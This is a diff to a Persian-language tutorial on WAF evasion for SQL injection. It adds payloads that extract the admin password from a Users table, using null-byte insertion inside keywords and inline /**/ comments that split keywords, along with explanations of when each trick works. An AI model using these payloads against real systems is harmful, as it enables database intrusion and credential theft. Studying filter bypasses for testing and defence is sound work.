@@ -44,12 +44,24 @@ or
 ```sql
 %00' UNION SELECT password FROM Users WHERE username='admin'--
 ```
+یا حتی به شکل زیر میتوان استفاده کرد:
+```sql
+' UN%00ION SE%00LE%00CT password FR%00OM U%00ser%00s W%00H%00E%00RE username='admin'%00-%00-
+```
+مورد بالا درصورتی استفاده میشود که WAF کلمات ورودی را پایش و عبارات دستوری SQL را درصورت مشاهده، حذف میکند.
 
 ### روش SQL Comments
 
 اضافه کردن Inline Comment ها درSQL نیز می‌تواند به معتبر ماندن دستورات SQL و دور زدن فیلتر تزریق SQL کمک کند. این تزریق SQL زیر را به عنوان مثال در نظر بگیرید:
+```sql
+‘ UNION SELECT password FROM Users WHERE name='admin'--
+```
 
 اضافه کردن Inline Comment ها در آن به صورت زیر خواهد بود:
+```sql
+'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/ 'admin'--
+' /**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE /**/ 'admin'--
+```
 ## روش #URL Encoding
 
 روش دیگری که از آن می‌توان برای عبور از سیستم‌های امنیتی بهره برد، استفاده از کدگذاری URL برای کدگذاری دستورات SQL است.
